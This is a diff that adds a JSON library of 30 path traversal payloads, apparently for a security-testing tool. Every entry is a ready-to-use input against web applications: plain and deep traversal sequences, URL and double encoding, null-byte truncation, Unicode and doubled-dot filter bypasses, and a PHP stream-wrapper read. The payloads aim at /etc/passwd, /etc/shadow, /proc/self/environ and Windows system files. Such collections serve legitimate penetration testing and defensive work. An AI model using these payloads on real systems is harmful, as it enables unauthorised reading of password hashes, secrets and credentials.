@@ -1,0 +1,48 @@
+{
+  "meta": {
+    "name": "Path Traversal",
+    "icon": "📁",
+    "description": "Path traversal (directory traversal) payloads for Linux and Windows. Covers basic sequences, URL encoding, double encoding, null-byte injection, filter bypasses, and direct file reads.",
+    "version": "1.0",
+    "updated": "2026-03-04",
+    "total": 30
+  },
+  "payloads": [
+    {"id":1,"code":"../etc/passwd","description":"Single-level traversal to /etc/passwd — starting point for testing","category":"basic","platform":["linux"],"tags":["basic","linux","passwd"]},
+    {"id":2,"code":"../../etc/passwd","description":"Two-level traversal — for apps that strip one level","category":"basic","platform":["linux"],"tags":["basic","linux","passwd"]},
+    {"id":3,"code":"../../../etc/passwd","description":"Three-level traversal — typical for web roots inside /var/www/html","category":"basic","platform":["linux"],"tags":["basic","linux","passwd"]},
+    {"id":4,"code":"../../../../etc/passwd","description":"Four-level traversal — covers deeper web root paths","category":"basic","platform":["linux"],"tags":["basic","linux","passwd"]},
+    {"id":5,"code":"../../../../../etc/passwd","description":"Five-level traversal","category":"basic","platform":["linux"],"tags":["basic","linux","passwd"]},
+    {"id":6,"code":"../../../../../../etc/shadow","description":"Deep traversal to /etc/shadow — contains hashed passwords (requires root)","category":"basic","platform":["linux"],"tags":["basic","linux","shadow","sensitive"]},
+    {"id":7,"code":"/etc/passwd","description":"Absolute path — works if the application allows absolute paths","category":"basic","platform":["linux"],"tags":["basic","linux","absolute"]},
+    {"id":8,"code":"/proc/self/environ","description":"Process environment variables — may contain secrets, flags, or db credentials","category":"basic","platform":["linux"],"tags":["basic","linux","proc","env","sensitive"]},
+    {"id":9,"code":"/proc/self/cmdline","description":"Current process command line — reveals application invocation and config","category":"basic","platform":["linux"],"tags":["basic","linux","proc","cmdline"]},
+
+    {"id":10,"code":"..\\..\\windows\\win.ini","description":"Windows traversal to win.ini — confirms path traversal on IIS/Windows","category":"windows","platform":["windows"],"tags":["windows","win.ini","iis"]},
+    {"id":11,"code":"..\\..\\..\\windows\\win.ini","description":"Three-level Windows traversal to win.ini","category":"windows","platform":["windows"],"tags":["windows","win.ini"]},
+    {"id":12,"code":"..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts","description":"Windows hosts file traversal — confirms deep traversal on Windows","category":"windows","platform":["windows"],"tags":["windows","hosts","system32"]},
+    {"id":13,"code":"C:\\windows\\win.ini","description":"Absolute Windows path — tests if absolute paths are allowed","category":"windows","platform":["windows"],"tags":["windows","absolute"]},
+
+    {"id":14,"code":"..%2f..%2fetc%2fpasswd","description":"URL-encoded / as %2f — bypasses filters checking for literal ../","category":"encoded","platform":["linux"],"tags":["encoded","url","bypass","linux"]},
+    {"id":15,"code":"%2e%2e%2fetc%2fpasswd","description":"Fully URL-encoded .. and / — %2e=dot, %2f=slash","category":"encoded","platform":["linux"],"tags":["encoded","url","bypass","linux"]},
+    {"id":16,"code":"%2e%2e/%2e%2e/etc/passwd","description":"Mixed encoding — dots encoded, slash literal","category":"encoded","platform":["linux"],"tags":["encoded","url","mixed","bypass"]},
+    {"id":17,"code":"..%5c..%5cwindows%5cwin.ini","description":"URL-encoded backslash (%5c) for Windows traversal","category":"encoded","platform":["windows"],"tags":["encoded","url","windows","backslash"]},
+
+    {"id":18,"code":"..%252f..%252fetc%252fpasswd","description":"Double URL-encoded / — %252f decodes to %2f then to / in two passes","category":"double-encoded","platform":["linux"],"tags":["double-encoded","bypass","linux"]},
+    {"id":19,"code":"%252e%252e%252fetc%252fpasswd","description":"Double URL-encoded .. and / — double decode bypass","category":"double-encoded","platform":["linux"],"tags":["double-encoded","bypass","linux"]},
+    {"id":20,"code":"..%255c..%255cwindows%255cwin.ini","description":"Double URL-encoded backslash for Windows — %255c → %5c → \\","category":"double-encoded","platform":["windows"],"tags":["double-encoded","windows","bypass"]},
+
+    {"id":21,"code":"../etc/passwd%00.jpg","description":"Null-byte truncation — truncates .jpg extension, targets C-based path validation","category":"null-byte","platform":["linux"],"tags":["null-byte","bypass","truncation","linux"]},
+    {"id":22,"code":"../etc/passwd%00.php","description":"Null-byte with .php extension bypass","category":"null-byte","platform":["linux"],"tags":["null-byte","bypass","php","linux"]},
+    {"id":23,"code":"../etc/passwd%2500.jpg","description":"URL-encoded null-byte (%2500 → %00 after decode)","category":"null-byte","platform":["linux"],"tags":["null-byte","url-encoded","bypass"]},
+
+    {"id":24,"code":"....//....//etc/passwd","description":"Doubled dot-slash bypass — ....// → ../ after stripping one sequence","category":"filter-bypass","platform":["linux"],"tags":["bypass","double-dot","linux"]},
+    {"id":25,"code":"..../..../etc/passwd","description":"Extra dots bypass — some WAFs strip ../  but not ..../ ","category":"filter-bypass","platform":["linux"],"tags":["bypass","extra-dots","linux"]},
+    {"id":26,"code":"..\\/..\\/ etc/passwd","description":"Mixed slash bypass — backslash-forward slash combination","category":"filter-bypass","platform":["linux"],"tags":["bypass","mixed-slash"]},
+    {"id":27,"code":"..%c0%afetc%c0%afpasswd","description":"Unicode overlong / encoding (%c0%af = / in old UTF-8 decoders)","category":"filter-bypass","platform":["linux"],"tags":["bypass","unicode","overlong","linux"]},
+    {"id":28,"code":"..%ef%bc%8fetc%ef%bc%8fpasswd","description":"Unicode fullwidth solidus (／) bypass — U+FF0F looks like /","category":"filter-bypass","platform":["linux"],"tags":["bypass","unicode","fullwidth"]},
+
+    {"id":29,"code":"/var/www/html/../../../etc/passwd","description":"Absolute path with traversal — starts from known web root","category":"filter-bypass","platform":["linux"],"tags":["bypass","absolute","web-root"]},
+    {"id":30,"code":"php://filter/convert.base64-encode/resource=/etc/passwd","description":"PHP stream wrapper — reads and base64-encodes /etc/passwd via PHP filter","category":"filter-bypass","platform":["linux"],"tags":["bypass","php","stream-wrapper","lfi"]}
+  ]
+}
